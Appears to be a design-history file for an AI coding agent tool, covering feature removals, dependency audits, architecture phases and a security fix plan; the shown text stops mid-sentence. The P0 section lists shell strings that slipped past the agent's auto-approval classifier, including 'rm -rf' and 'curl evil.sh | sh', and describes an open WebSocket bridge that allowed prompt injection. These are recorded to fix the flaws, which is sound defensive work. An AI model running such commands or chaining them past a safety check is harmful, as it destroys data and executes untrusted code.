# History

Moved out of `CLAUDE.md` on 2026-10-25, verbatim, when that file passed the 150k characters
Claude Code loads. These are records — removals, audits, the Direction phases, the P0–P3 plan and
"The fork" — kept so a decision is not re-derived or re-tried. Section references such as "see
Subagents above" point back into `CLAUDE.md`.

### GitHub agent — removed 2026-09-19, documented to be rebuilt

Deleted on the owner's call: *"delete github for now, maybe we will have it
later so document the things as they are today."* 2,009 lines in
`server/src/github/`, plus a tab, two hooks, a content script and eight test
files — 8% of the server source for a second product living inside the first.

**Why it went.** Every `flow: 'github'` entry in the error log was `poll: fetch
failed`. Three review directories were ever written. The tab showed comments
stuck at `⚠ not analysed` after being sent for analysis, with no way to tell
"still working" from "silently failed" from "done, and the row is stale". And
it was competing for attention with a core loop that produced six separate
"the prompt promises what the code refuses" bugs in a single day.

Not deleted because it was bad. Deleted because a half-working second product
costs more than it returns while the first one is still being made to work.

#### What it did

| file | lines | job |
| --- | --- | --- |
| `github-poller.js` | 476 | polled the REST API for PRs, comments and workflow runs |
| `github-event-handler.js` | 380 | orchestrator wiring the poller to everything below |
| `review-writer.js` | 376 | wrote one `.md` per comment into `.agent/github-reviews/PR-<n>/` |
| `ci-log-parser.js` | 198 | pulled the actionable failure out of an Actions log |
| `github-review-prompt.js` | 166 | the system prompt for investigating a comment |
| `review-task.js` | 162 | turned one comment into one prompt |
| `work-queue.js` | 119 | what to analyse and when — knew nothing about GitHub |
| `comment-classifier.js` | 70 | which comments were worth a pass |
| `github-config.js` | 62 | token, repo, intervals |

Surfaces: `ui/components/GithubTab.jsx`, `ui/hooks/use-github-tab.js`,
`ui/hooks/use-github-keys.js`, `^o` to open the tab, `/github` and its
subcommands, `extension/content-scripts/github-bridge.js` for reading comment
bodies off the page.

#### The decisions worth keeping, if it is rebuilt

- **The tab is for browsing; the stream is for noticing.** Every new event also
  arrived in the transcript as one dim row (`githubNoticeRow`), because that is
  where you are already reading. Nothing interrupted, nothing was inserted into
  the prompt. The author was capped at 20 characters: a GitHub username runs to
  39, and the row is drawn in the *live* frame, where 78 columns is one row at
  80 and two at 72 — and a row that wraps is charged as one and drawn as two.
- **One list, three levels.** PRs → that PR's comments → the analysis in your
  editor, where `⏎` means "go deeper" at every level and `esc` comes back. It
  had been *two* lists — an activity feed you landed on and a PR explorer behind
  an unadvertised `p` — showing overlapping things, with `⏎` meaning something
  different on each of three screens. The feed was also empty on a fresh session
  with open PRs sitting right there, because it only ever held events from that
  process. `summarisePrs` folded the feed into "what does the agent know about
  each PR", which is what the rows counted.
- **`height={rows}` with `overflow="hidden"`, budgeted at `terminalHeight - 3`.**
  The banner is a `<Static>` item and cannot be cleared, so the screen has to
  push it off; remounting `<Static>` to lose it reprints the whole transcript,
  which is where a second banner came from. `- 2` looks exact and costs one
  `ESC[2J` on the way back, because Ink's frame carries a trailing newline the
  row count does not.
- **No box and no inner scrolling.** The only box-drawn frame in this product is
  the input field, where the border *means* the mode. The list was windowed
  against the budget and said what it trimmed (`… N more`).
- **The agent had no shell.** `runHeadlessTask` offered only `grep_search`,
  `read_file`, `list_directory`, `search_files` and `ask_subagent`, so it could
  not run `git checkout` whatever it was asked — a structural guarantee, not a
  prompt rule. Rebuild it that way.

#### What was still broken when it went

- **Comments sent for analysis never updated their row.** Unknown whether the
  analysis ran, and unknown whether a plan file was written. Start by comparing
  the tab's `activity` against what is on disk in `.agent/github-reviews/`.
- **The reviewer could not see git.** The prompt handed it a title, a number, a
  branch *name*, the comment and a diff snippet — no current branch, no
  divergence, no merge base. So "why is there a merge conflict", which is what
  people actually asked it, was unanswerable. The fix is two parts: put the git
  facts in the prompt (the server computes them; `rev-list --left-right --count`
  is the diagnostic), and only then consider an allowlisted read-only `git`
  tool. An allowlisted `git` is still a shell unless `-c`, `-C` and
  `--exec-path` are refused: `git -c core.pager=sh` runs `sh`.
- **`.agent/github-reviews/` and `/plans` meant two different things.**
  `migrateGitHubReviews` in `core/migrate.js` renamed the older
  `github-pr-plans/` and refused to clobber; that migration is kept.

### ChatGPT removed, 2026-09-19

Owner's call. It makes the code match a product decision that was already standing and retires
the caveat that was attached to it. `extension/content-scripts/chatgpt-bridge.js` is deleted;
eleven other files lost a line or two each. What is worth keeping is the parts that were **not**
mechanical:

- **Duo survived by changing meaning.** With one model, `reviewer !== main` meant no reviewer at
  all. See "Subagents" above for why a second Gemini tab is still worth having — and why the
  guard that forbade it had outlived its reason by the time it was removed.
- **An old config is folded on read, not left alone.** `_saveConfig` deliberately preserves keys
  it does not own, so a stored `modelConfig.main: 'chatgpt'` survives every save and points the
  agent at a site with no bridge, silently. `_loadConfig` folds it — reading from the **on-disk**
  object, not the merged one, because the merge's defaults would shadow the legacy key. That is
  the same mistake `config-merge.test.js` already covers for `effort`, and the negative control
  matters as much as the fix: a ChatGPT main with **no** reviewer must stay solo, or folding
  turns every solo session into a duo one.
- **Old sessions need no migration, and that is a claim with a test.** A session filed before the
  removal carries `thread: {model: 'chatgpt'}`. `sameThread` compares model *and* id, so it
  resolves to `replay` rather than `continue` — the honest answer, because the conversation still
  exists and nothing here can reopen it.
- **The jsdom tests lost their reason and kept their value.** They ran against both bridges so a
  divergence failed the build. The comment in them now says not to restore a second target to
  make that loop mean something again.
- **`content.js` is bundled.** `npm run build --workspace=extension` before committing, or Chrome
  loads the old `service-worker.js` and none of it is real.

### Removed as dead, 2026-10-19

Same method as the audit below — every export, grep for a caller.

- **What the GitHub removal left behind.** `ui/components/KeyHints.jsx` (its only user was
  `GithubTab`), and `formatTokenExpiry` / `formatPollTime` in `format.js`, which drew the
  tab's token chip and poll time. Both formatters had green tests and no caller — tests that
  pin a dead function make it look alive to anyone counting coverage.
- **`flowLogger`**, a bound-logger convenience nothing ever adopted, and two unused test
  seams: `edit-diagnostics.js`'s underscore exports and `resetExtensionVersionCache`.
- **Not dead but duplicated:** `/image` carried its own inline clipboard reader beside the
  unused `readClipboardImage()`, and the copy wrote every paste to one fixed
  `clipboard-image.png` — a second screenshot overwrote the first while it was still attached.
  It calls the module now, which asks for PNG first (macOS converts a TIFF clipboard on
  request, as the inline copy relied on) and falls back to the advertised flavour.

Left alone on purpose: exports used only inside their own file. Dropping the keyword is churn
with no behaviour behind it.

### Removed as dead, 2026-09-16

Found by auditing every export for a caller. Recorded because "why is this gone?" is a
question someone asks six weeks later, and because two of them were not simply unused.

- **`context/token-counter.js`** — a whole 30-line class, `TokenCounter`, reachable from
  nothing. Its only remaining mention was a *comment* in `agent-loop.js`. Token estimation
  moved to `contextChars` counted where it crosses the bridge, which is the one place that
  cannot be wrong about it; the class was left behind.
- **Five `paths.js` exports** with no caller anywhere, including inside `paths.js`:
  `contextSummaryPath` and `globalContextPath` (leftovers of the retrieval subsystem deleted
  in Direction phase 1), `skillPath`, `REL_ARTIFACTS_DIR`, and `planReviewPath`. The last one
  is worth a word: the companion *does* write `plan-review.json`, but that is its own draft
  state while you are commenting, and the comments reach the CLI inside
  `plan-approval.json`. The path helper was the dead part, not the feature.
- **The side panel's context meter** — markup, CSS and `updateContextBar()`, which nothing
  called. Worse than unused: the server never sends token counts to the panel at all, so the
  bar read a permanent **0%** while your context could be at 90%. A meter that is always
  wrong is worse than no meter, and the CLI has the real one in its status bar. Putting it
  back is a feature — it needs a new message type — not a missing call.
- **Three test seams that no test used** — `__tabLanes` and `__sessionTabs` in the
  extension's `content.js`, and `resetSymbolIndexes`. Written in the same commits as the
  things they were meant to test, and then not needed. A seam nobody pulls is API surface
  with no reason to exist.

**One thing the audit found was not dead but unwired.** `rememberWorkspace` had no callers,
which meant nothing ever wrote `recent-workspaces.json` — so `listWorkspaceCandidates`'s
`recent` category, which reads that file and has always been in the `/set-workspace` picker,
silently offered nothing. The reader, the writer and the picker row all existed; the call did
not. `main.js` makes it now, after the workspace existence check, so a path that does not
resolve is not offered back as somewhere you have been. Verified: 0 recents before, 2 after.

**The side panel's dropped messages — two of them were a hang, fixed 2026-09-16.** The
count was worse than "at least three", and the ones that mattered were not the cosmetic
ones. `ask_question` and `request_command_approval` both park the turn on
`await new Promise(...)` with **no timeout**, send the prompt through `sendToPanel`, and
wait. The panel rendered neither — and there was no inbound message type it could have
answered with even if it had. So a turn driven from the panel stopped dead at the first
question or first risky command, and because the panel disables its send button behind
`isWaitingForResponse` until a reply arrives, it then accepted no further prompts at all.
The reported symptom was "the sidebar doesn't send prompts".

The resolvers already existed and were already careful — `cancelQuestion` resolves rather
than rejecting, precisely because leaving the promise pending *is* the hang. Only the way
in was missing: `question_response` and `command_approval_response` are now inbound cases
on the bridge, relayed by the worker, with the panel drawing both.

`response_stream` is handled too, so the panel no longer sits on "Thinking…" for a whole
turn and then jumps to the finished answer.

`github_plan_generated` is handled too, as one line. **The list of what else the panel
"drops" was wrong, including the version of it written earlier the same day** — it came
from grepping `type:` across the server, which counts things that are not panel messages
at all. Checked properly: `github_notification`, `github_processing_started` and
`github_processing_finished` are pushed to `pendingGitHubNotifications`, a **CLI-only
buffer drained by a getter**, and never broadcast — so there is nothing reaching the panel
to drop. `compaction_summary` is a `conversationHistory` entry, not a message. Of the whole
apparent list, exactly one type was really arriving and being ignored.

`inject_prompt`, `end_session` and `heartbeat_ack` are addressed to the worker and the
content script, and the panel is right to ignore them.

The method matters more than the correction: **a grep for `type:` finds message-shaped
literals, not messages.** Follow the value to the `broadcast` call before believing a
surface is missing something.

**The lesson worth keeping:** a surface that ignores an unknown message type is not
equally harmless for every type. Dropping a *notification* costs a missing line; dropping
a *request* deadlocks whatever is waiting on the answer. When adding a message the agent
loop blocks on, every front-end needs a way to reply — or a timeout.

An old `.agent/config.json` can also carry `contextFolders` and `modelConfig.reasoner`,
fossils of features deleted in Direction phases 2 and 7. Nothing in the source reads either.
They are left in place on purpose: config saving deliberately preserves keys it does not
own — that was a bug fix — and auto-pruning known-dead keys would fight it for no gain.

**`figlet` is gone; the one font it was used for is vendored.** It was 20.8MB — 328 fonts
across `fonts/` and `importable-fonts/` — and this app rendered exactly one, `Standard`, for
the wordmark: **21% of `node_modules` for a banner**. The font is 30KB in `ui/fonts/` and
`ui/figfont.js` renders it. Measured: `node_modules` **98.5MB → 77.2MB**.

Only what `Standard` needs is implemented. Its header sets horizontal smushing with rules 1,
2, 4 and 8; the vertical rules it also sets never apply, because the banner is one line.
Correctness was not argued, it was compared — while `figlet` was still installed, **25,110
strings** (every printable character alone, the banner, and 25,000 random strings of 1–12
characters) were rendered through both and required to match byte for byte.

Two things that comparison caught, neither of which would have been found by looking:
the shipped `.flf` files are **CRLF**, so splitting on `\n` leaves a `\r` as each row's
"endmark" and strips nothing — every glyph keeps its `@` and none of them overlap. And a row
where one side is **entirely blank** cannot collide, so it must not limit the slide; counting
its blanks drew `7,` and `W.` one column too wide. That was the difference between 3,106 and
3,110, and then 25,110 of 25,110.

The banner was also being rendered **twice** — a synchronous render to seed the state and an
async `figlet.text` in an effect that recomputed the same string on mount. The async half was
pure duplicate work and went with the dependency.

**`@inquirer/prompts` went too** — sixteen packages for one yes/no that fires only when the
port is taken. `node:readline/promises` does it in six lines. Measured: another **4.4MB**,
more than the 0.6MB the top-level directory suggested, because of what it pulled in behind it.

**Code blocks are drawn plainly whichever way they were written.** `renderMarkdown` lifts
*fenced* blocks out before `marked` sees them and draws them with `renderBlock`; an *indented*
block never matched that lift and fell through to `marked-terminal`, which highlights it. The
result was backwards — the shape this project controls and designed for came out plain, the
rare untagged four-space shape came out coloured. Measured with colour forced: fenced 6 ANSI
spans, all of them rules; indented 14, with the number green. A `code` renderer now draws both
the same way. It is overridden rather than lifted out by regex because four-space indentation
is also how a list continues, and `marked` can already tell those apart.

That makes `highlight.js` unreachable — **4.3MB and ~60ms of startup for output that can no
longer be shown** — but it is a transitive dependency of `marked-terminal`, so removing it
means replacing that renderer. `format.js` already overrides lists and code; what remains is
headings, tables, blockquotes, emphasis, links and rules. Left as a deliberate choice, not an
oversight.

**Total: `node_modules` 98.5MB → 72.7MB.**

**Dependencies: none unused.** Every entry in all four `package.json` files is imported,
used in a script, or `@types/react`, which is types-only and exists for editor JSX
intellisense. `@inquirer/prompts` looks unused to a naive grep and is not — `main.js` reaches
it through `await import()` on the `EADDRINUSE` path. `chalk` was the one genuinely dead
dependency and went earlier the same day.

## Direction

Agreed 2026-09-10, not yet built. Recorded so the reasoning is not re-derived.

**The problem being solved:** seven mechanisms exist for "tell the model about this project"
(`AGENT.md`, `.agent/rules.md`, scoped `rules.md`, `skills/`, `memory.json`, `mistakes.md`,
`contextFolders`). Phases 2 and 3 leave two: `AGENT.md` and `skills/`, plus `memory.md`, which
is the agent's own notes rather than a place you tell it anything. with six different discovery rules between them. The count of *rules* is the
mess, not the count of files.

**The target:** two axes, one mechanism each.

| axis | question | mechanism |
| --- | --- | --- |
| scope | who does this apply to? | **where the file is** — walk up from the code, nearest wins |
| cost | always in context, or on request? | **which file** — `AGENT.md` vs `.agent/skills/` |

Repo-specific knowledge is *not* a skill. A skill's contract is "read me when my description
matches"; repo conventions match *always* when you are in that repo, and encoding "always" as
"when relevant" hands the model a judgement it will sometimes get wrong — after it has already
edited something. The test: *should the agent know this before its first action in this repo?*
Yes → `AGENT.md`. Fine to discover later → skill.

Memory is **scoped and never walked** (`.agent/<scope>/memory.md`), kept separate from
`AGENT.md` so that file can always be trusted to say what the human wrote. Promoting a learned
fact to a standing instruction is a manual edit, deliberately.

| Phase | Change | Removes | Status |
| --- | --- | --- | --- |
| 0 | `codeDir`; `AGENT.md` and skills read from the code location, not the workspace; watcher scoped | — (bug fixes) | **done** `5513557` |
| 1 | Delete `semantic_search` + `workspace-indexer` + `workspace-summarizer` + dead `ContextManager` code | ~290 lines, `madge`, the startup index build | **done** `0b93bf6` |
| 7 | Two bridges only; drop the Claude bridge, `swarm`, `ask_reasoner` | ~520 lines, 14 DOM selectors | **done** `8e60a24` |
| 2 | One instruction surface: `AGENT.md`, walked | `rules.md`, `mistakesPath`, `/init-skills`, `contextFolders`, `/context add\|remove\|list` | **done** |
| 3 | Memory as `.agent/<scope>/memory.md`, bounded in the prompt | the write-only trap | **done** |
| 4 | One model picker, five valid states, `/reasoning` → `/effort` | `reasoningEffort`, `_effortToTier`, `modelTier`, `reasoningLevel` as stored keys | **done** |
| 5 | Keep `--scope` and derived resolution; delete the runtime switcher | `/scope`'s picker, `setScope`, `listScopes`, the reload path | **done** |
| 6 | Per-model extension lock; derive topology from `modelConfig` | `topology` as a knob, `/mode`, the mode menu, the two-step config picker | **done** |

**What phase 2 kept (phase 2).** Bare `/context` survives as what its name says — a report of
what is in the window. Only `add|remove|list` went: registering folders of `.md` files was a
second way to give the model standing instructions, and that is the thing being removed, not
the ability to ask what the prompt currently costs.

Retired files are **named, never moved**. `.agent/rules.md` and `.agent/mistakes.md` stop being
read, and `runMigrations` prints one line saying so (`retiredInstructionFiles` in `core/migrate.js`).
Folding them into `AGENT.md` automatically was the obvious move and is wrong: `AGENT.md` is
usually tracked in git, so the agent would be writing an unasked-for diff into the user's repo on
startup — and CLAUDE.md's own rule is that `AGENT.md` can always be trusted to say what the human
wrote. The pre-`.agent/` migration path is the exception: `.gemini/rules.md` moves to `AGENT.md`
because `move()` refuses to clobber, so it only lands where there is no `AGENT.md` to disturb.

**The write-only trap has happened twice, and the second one was found by using the
product.** `.agent/artifacts/task.md` is the same shape: the system prompt tells the model to
create a checklist and tick items off, the file is read only by `App.jsx` to draw a row, and no
prompt ever carried it back — verified absent from turn 0, from every tool-result turn, and from
twenty-five further turns. So ticking meant guessing the exact line for `edit_file`, which fails
on a mismatch. Fixed the same way: `<task_checklist>` rides every turn (137 characters for a
three-item list), because ticking is a per-turn act. **If you add an artifact the model is told
to maintain, the question to ask is what carries it back.**

**The write-only trap, measured (phase 3).** `getAllMemories` had no callers. `manage_memory add`
wrote to `memory.json`, the system prompt instructed the model to use it, and no prompt ever
carried a single fact back — a tool call per fact, for nothing, forever. The fix is the missing
half, not a new mechanism: `_loadMemory` puts the facts in `<memory>` on turn 0 and every
refresh, numbered, because `remove` takes a position and the model had been choosing indices
into a list it had never been shown.

Bounded at 40 facts / 4,000 characters, degrading to a count and the path. Memory is the only
context source that grows on its own — every turn can add to it, nothing prunes it — so it is
the only one that could walk the system prompt into Gemini's repetition filter over months
without anyone making a decision. That bound is the "index-only" in the row above.

JSON became markdown because a learned fact is exactly the thing that is subtly wrong six weeks
later, and a fact you cannot correct in an editor does not get corrected. `.agent/memory.json`
is **converted** on startup where `rules.md` is only reported: it is machine-written, untracked,
inside `.agent/`, and the alternative is the agent silently forgetting everything.

**Nine states, five meanings (phase 4).** `modelTier` chose the prompt profile, `reasoningLevel`
chose how hard the pro profile pushes and did nothing on the flash tiers, and `reasoningEffort`
was a third name for the first — written on every change, read only as a fallback. The UI
apologised for the impossible combinations at the point of use ("you are on the FLASH tier,
where reasoning levels do nothing") instead of preventing them.

`core/effort.js` is now the one ladder — `flash`, `flash-thinking`, `brief`, `standard`,
`deep` as of phase 4, then **three rungs**, then **renamed to the picker's own words**:
`lite`, `flash`, `pro` (2026-09-20). The old `flash` is `lite` and the old `flash-thinking`
is `flash`; the collision was the point, because "flash" named our terse rung while the
browser uses it for the middle one.
A stored `brief` / `standard` / `deep` folds to `pro` on read, *before* the `modelTier`
branch, so a disagreeing legacy tier cannot drop a pro user onto the terse profile.
`modelTier` and `reasoningLevel` survive as *derived* values because the prompt builder really
does branch on both, but nothing stores them separately, so they cannot disagree. Each rung also
names the browser tab it is written for — a pro-tier prompt in a Flash tab is a long prompt to
the model that handles long prompts worst.

`effortFromConfig` folds an existing config on read, preferring the tier over the level when
they contradict (the tier is what the prompt actually branched on). It is deliberately fed the
config *from disk* rather than the merged object: the default `modelConfig` already carries
`effort: 'standard'`, and folding the merge let that default shadow every legacy key — a bug the
pty probe caught and `config-merge.test.js` now covers.

**Why the scope switcher goes (phase 5).** `setScope` rebuilt `SessionStore`, the conversation
history, `MemoryManager`, `ContextManager` and the prompt state in one call — its own doc comment
said switching scope "is closer to opening a different project than to changing a setting". That
is the argument against having it as a setting: the transcript on screen belongs to the old
scope, and the switcher swapped the history out from under those turns while they were still
being displayed. `--scope` at launch and the derived walk reach the same place with no such
window. The name still answers, read-only, because a group user typing `/scope` and getting
"unknown command" learns nothing about `--scope`.

**Why `semantic_search` goes (phase 1).** Measured: its tokenizer splits on non-alphanumerics
only, so `getUserById` is one token and the query `user` can never match it — broken for the
query type that dominates code search. A broken tool is worse than a missing one, because the
model reaches for it and concludes the code is not there. Even repaired it is keyword matching
that `grep_search` already does better, and it costs a full-repo read at every startup. The
madge dependency graph dies with it: it is read only inside `search()`.

**What phase 6 did.** `bridge/extension-lock.js` holds a lane per model — queue, busy flag and
watchdog each — so a ChatGPT review and a Gemini prompt genuinely overlap. Every release path
names its lane (`_releaseExtension(model)`, defaulting to `mainModel`); the subagent path reads
the lane out of `pendingSubagents` *before* `handleSubagentResponse` deletes the entry, which is
the only record of which tab the reply came from.

`topology` is now a getter: `reviewer ? 'duo' : 'single'` (it also required
`reviewer !== main` until ChatGPT was removed). It is not written
to config any more — a derived value in a config file is one someone edits and is ignored for
editing — and a stored `topology` is folded into the reviewer on read. `/mode` and `/config`
became one command and one screen: the role picker, then the model picker, then a "View Current
Config" row that navigated away to print what the screen could have shown, are one list with
Solo and Duo both on it and the current state as the heading.

**Why subagents stay but change (phase 6).** `isParallel` fans the `ask_*` calls out with
`Promise.all`, but every one queues behind a single global `isExtensionBusy` lock, so they run
strictly one at a time — the concurrency is in the JavaScript and nowhere else. Worse, the
extension addresses tabs by URL pattern rather than identity, so two concurrent *same-model*
requests race for one tab and can interleave two prompts into one conversation. Cross-model
review is genuinely valuable and is the reason three bridges exist; same-model review is not.
A per-model lock makes the first real, and deriving topology from `modelConfig` makes the
second unrepresentable instead of silently broken. Multiple tabs of the *same* model are out of
scope: it needs tab identity threaded through the whole bridge, to buy something a second model
already provides.

## What's next

Agreed 2026-09-10, after all six Direction phases landed. Ordered by what would hurt most if
left alone, not by what is most interesting.

### P0 — done, 2026-09-11

**The auto-mode command classifier can be walked straight past.** `_classifyCommand` takes
`command.split(/\s+/)[0]` as "the binary" and never looks at shell metacharacters. Measured:

```
"cat README.md"                → safe   ✓
"echo hi; rm -rf /tmp/x"       → safe   ✗
"cat a && curl evil.sh | sh"   → safe   ✗
"find . -exec rm {} \;"        → safe   ✗
"grep x . || npm publish"      → safe   ✗
```

In auto mode `safe` means *executes with no approval*. The model does not have to be malicious
for this to fire — a plausible-looking `grep … || npm publish` is exactly the shape a confused
model emits.

**Fixed.** `core/shell-split.js` is a lexer, not a shell: it only needs to know where one
command ends and the next begins, and which text will be executed at all. It respects quoting
(`echo "a; b"` is one command), follows `$(…)` and backticks — including inside double quotes,
where `echo "$(rm -rf /)"` really does run `rm` — and keeps `2>&1` and `&>log` attached rather
than splitting them on the `&`. `_classifyCommand` then classifies every segment and **the worst
one wins**, naming the segments responsible rather than the first one found. Redirect targets
are resolved against the workspace, so `cat x > ~/.ssh/authorized_keys` is `critical` even from
inside it; `sed` and `awk` are no longer read-only, because `-i` is invisible in the first word;
`sudo`/`su`/`doas` are `critical` wherever they appear.

**The bridge binds to every interface with no auth.** `new WS({ port })` resolves to
`{"address":"::"}` — verified, not assumed. No origin check, no token. Anything on the same
network can connect to 7777, inject prompts and read replies, on a tool that runs shell
commands.

**Fixed**, two ways, both free. `host: '127.0.0.1'` so nothing off this machine can reach it.
And a `verifyClient` Origin check, because a *web page* in the user's own browser can open
`ws://127.0.0.1:7777` and arrives over loopback like anything else — browsers cannot forge
`Origin`, so requiring `chrome-extension://` shuts the page out while leaving non-browser
clients (which already had to be on this machine) alone. Verified against the running server:
`lsof` shows `127.0.0.1:7821`, a website origin gets `403`, the extension connects.

**What remains:** another process running as the same user can still connect. Closing that needs
a shared secret the extension can read, which needs a setup step — a UX decision, not a patch.

**`diff-engine.js` has no tests.** 358 lines, and it is the thing that overwrites files.

**Fixed**, and writing them turned up a real bug. `_createBackup` used
`relative(workspace, absPath)` directly, and the tools accept absolute paths — so backing up a
file outside the workspace produced `../../../tmp/x`, and `resolve(backupDir, that)` wrote the
backup *outside the backup directory and outside the workspace*: with workspace `/a/b/c`, a
backup of `/tmp/x` landed at `/a/b/tmp/x.bak`. Anything outside now goes under `_external/`.

### P1 — done, 2026-09-11

**Validate tool arguments.** *(done — `mcp/validate-args.js`.)* `zod` is a dependency and
`mcp/mcp-server.js` never imports it.
`TOOL_DEFINITIONS` declares a schema per tool and `PromptBuilder` renders it into the prompt as
*the contract*, then `_extractToolCalls` does `_cleanJsonString` → `JSON.parse` → dispatch with
nothing checking the args against the schema just promised. A wrong-typed arg fails deep inside
a handler with a message the model cannot act on. Validating and returning the specific schema
error for repair is most of what a real tool-call API buys, and it is available today.

Schemas are built from the declarative `parameters` block, so there is one source of truth. It
also **coerces what is obviously meant** — `"10"` for a number is a working turn that used to be
thrown away — but deliberately *not* booleans the same way: `Boolean("false")` is `true`, which
would silently invert `isRegex` and `recursive`, the two flags where it matters most. The words
are read explicitly instead.

**The workspace commands, the way `/scope` went in phase 5.** *(done.)* `setWorkspace` rebinds
`mcpServer`, `promptBuilder`, `diffEngine` and `contextManager` but *not* `sessionStore`
(deliberately), *not* `memoryManager`, and *not* the config. So after `/workspace`:
`promptBuilder._loadMemory()` reads the new project's `memory.md` while `manage_memory add`
writes to the old one, and the old project's allowlist stays armed against the new project.
`/agent-dir` goes outright — tools already take absolute paths (`edit-file.js:15`) and the
system prompt already grants self-editing, so it unlocks nothing and silently repoints state.
`/workspace` becomes read-only; `/set-workspace` becomes a *restart* picker, which the exit-75
supervisor now makes possible. The choice is left in `~/.agent/next-workspace` and `src/index.js`
consumes it on relaunch — a file, because the child cannot rewrite its own argv, and read-once,
because a stale handover would silently override `--workspace` on every later start.

**Settings rows can outgrow the viewport.** *(done.)* `describeSettings` padded to a fixed width
with no bound against terminal width, so long values wrapped — in the live frame, which is the
one place that must never happen. The hint truncates first: it is the part you can lose and
still know what the setting is set to. Verified at 72 columns.

**Instrument `looksLikeMultipleDrafts`.** *(done — `op: 'multiple_drafts'`.)* The other two
detectors logged and this one did not, so there was no evidence it had ever fired at all —
exactly the state in which a detector that works cannot be told from one that does nothing.
`/logs agent` answers it now. **Still to do: read it after a week of use and decide.**

**Characterisation tests for `agent-loop.js`.** *(started.)* `_extractToolCalls` is covered —
it is what stands in for a tool-call API here, so it is the most load-bearing text processing
in the project, and it turned out to handle every adversarial case put to it: braces inside
strings, nested objects, raw newlines in string literals, and unfenced JSON. The retry and
dispatch paths still want scaffolding and are left for the split in P3.

### P2 — features

- **Settings tabs** — *done.* Three (`Settings · Status · Context`), because those are the
  three questions people open the page to ask; a fourth tab with two rows in it is a worse
  answer than a third tab with six. **Tab** cycles them, not ←/→, which the filter field needs
  for its cursor — inside a menu the agent's own bindings are inert, so tab is free there and
  nowhere else. Typing searches *every* tab and says so, because making someone find the right
  tab before they can search is asking them to know the answer first. Escape clears a filter
  before it closes the page. `/context`'s numbers live on the Context tab too.
- **`server/src/prompts/*.md`** — *done, partly.* The point is not readability: a prompt change
  was invisible in a diff, one word inside a template literal in a 1,000-line file, and that
  file is the one with the never-bulk-edit-with-a-regex warning. Template literals also have
  escaping rules that prose does not — a single stray backtick there surfaces as
  `ReferenceError` from an unrelated function.

  Only **static** prose moved (~116 lines, seven files): the two cheap-rung protocols,
  both tool-call formats, the terse core rules, the pro guardrails and the plan-first step.
  The files were named after the rungs and moved with them in 2026-09-20's rename —
  `reasoning-lite.md` / `reasoning-flash.md`, and `core-terse.md` /
  `tool-call-format-terse.md` for the two that serve *both* cheap rungs. Anything the builder computes stays in JavaScript, because a markdown file
  full of `${isBrief ? '2' : '3'}` is worse than what it replaced. The move was verified
  byte-for-byte: all ten effort × topology prompt shapes came out identical, and one did not
  at first — `trimEnd()` had eaten a trailing newline that the assembled prompt depended on.
  `prompt-loader.test.js` guards it.

  **Generating the tool definitions — done, 2026-09-16.** It could not be done as originally
  described: `ask_question`, `ask_subagent`, `ask_researcher`, `ask_reviewer` and `manage_memory`
  are dispatched in `agent-loop.js` and were in no array at all, so there was nothing complete to
  generate *from*. `core/tool-catalog.js` is that list — all eighteen, declared once, with which
  tier sees what and which topology offers it — and `_buildToolDefinitions` is now two lines that
  assemble it. `_buildToolAnchor` and `_buildToolIndex` already derived from that method, so they
  followed for free.

  The text was moved mechanically rather than retyped, and all twenty shapes (five efforts × two
  topologies, tool block and full turn-0 prompt) come out byte-identical — two runs of that
  comparison caught two real transcription faults first. `runHeadlessTask`'s list stays its own
  text, because it is a deliberate subset in a different shape carrying a correction the full
  definitions do not; its *membership* is checked against the catalog instead.

  `toolCatalogDrift()` reports all three disagreements rather than throwing on the first — a tool
  that runs but is never described, one described that nothing dispatches, and a required
  parameter missing from the prose. Each branch has a negative control, because a drift check
  that compares an empty list to an empty list passes forever.
- **Extension error richness** — *done.* The bridge already read `payload.op`/`stage`; nothing
  sent them. Service-worker errors now carry `op`, `stage`, `targetModel` and the DOM-side
  message that actually failed. A content script's *thrown* error crosses its catch as the
  message alone, so it prefixes `[stage]` and the bridge lifts it back out — a changed selector
  on gemini.google.com now logs as `find_input` rather than "failed".

  **This used to say content scripts "cannot set fields on that payload", and that was never
  true of payloads they build themselves** — three already set `op`, and the worker forwards
  `{type, payload}` verbatim. It nearly cost `level: 'notice'` on `menu_left_open`, which
  depends on a field surviving that hop. `picker-containment.test.js` pins the verbatim relay,
  because a worker that rebuilt the payload would drop every field silently.
- **The ChatGPT bridge's image path** — *fixed, then deleted with the bridge.* Kept as a
  record of the failure mode: it matched the `<image_data>` block and **deleted** it, then
  pasted the remaining text, so `/image` sent a prompt discussing a screenshot nobody had been
  given. A scrape that silently drops what it cannot handle looks identical to one that
  works.
- **`grep_search` for large repos** — *done.* Several patterns in one call (`["rate limit",
  "throttle", "quota"]` is one search, not three round trips), optional context lines capped at
  five, and results grouped by file with the busiest file first — on a large repo the module
  that owns a concept is usually the one that mentions it most. Fifty flat rows also repeated
  the path fifty times, and every one of those characters is retyped into the browser next turn.
  It probes one match past `maxResults` so it can tell "exactly fifty" from "fifty and we
  stopped counting": ripgrep's `--max-count` caps *per file*, so without the spare there is
  never a surplus to notice. See "Search, and why there is still no index".

### P3 — done, 2026-09-11 (except the GitHub restructure)

- VS Code terminal shell integration — *built, then **removed on 2026-09-26**.* The companion
  forwarded failed commands' tails to `.agent/state/terminal.jsonl` and the CLI drained them into
  the input box as a marker you send or delete. "Offered, not acted on" was the right design and
  it was implemented correctly at both ends.

  **It never produced a single record.** On a live install `editor.json` and
  `diagnostics.json` are written continuously while `terminal.jsonl` was never created — so
  this is *not* the write-only trap recorded twice elsewhere here, where a writer had no
  reader. Both halves worked; the gate was never passed. The offer appeared only when a
  command failed in an *unwatched* terminal, **once per session**, as a dismissable toast,
  and v1.5.0's own note had already written the epitaph: *"a feature nobody can find is the
  same as one that is off."*

  Removed rather than re-gated, on the owner's call. **The number is the argument**: zero uses
  across the whole history of the feature is not a discoverability hypothesis worth a second
  guess. Companion `1.7.0`.

  *If it returns*: the thing to fix first is that the offer is tied to a failure happening.
  A standing affordance — a status-bar toggle, or remembering the choice per workspace rather
  than per session — is what it never had.
- Native folder picker — *done.* `/skills dir add` with no path, and Browse… in the workspace
  picker. macOS, zenity, kdialog or PowerShell, and offered **only** where one exists: a menu row
  that silently does nothing is worse than no row, because people press it twice and conclude the
  tool is broken.
- **Restructure the GitHub PR agent** — overtaken: the agent was deleted on 2026-09-19
  instead. See "GitHub agent — removed 2026-09-19" for what to keep if it is rebuilt.
- Split `agent-loop.js` — *done.* The sixteen-case slash-command switch moved to
  `core/slash-commands.js` as a function taking the loop, so the dependency reads in the
